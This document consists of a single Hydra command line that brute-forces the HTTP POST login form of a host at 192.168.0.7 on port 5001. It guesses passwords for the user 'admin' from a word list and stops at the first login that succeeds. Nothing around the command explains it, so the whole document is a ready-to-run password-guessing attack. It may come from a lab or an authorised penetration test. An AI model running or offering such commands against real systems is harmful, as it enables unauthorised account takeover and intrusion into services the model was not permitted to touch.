hydra -l admin -P pass.txt 192.168.0.7 http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed" -s 5001 -f


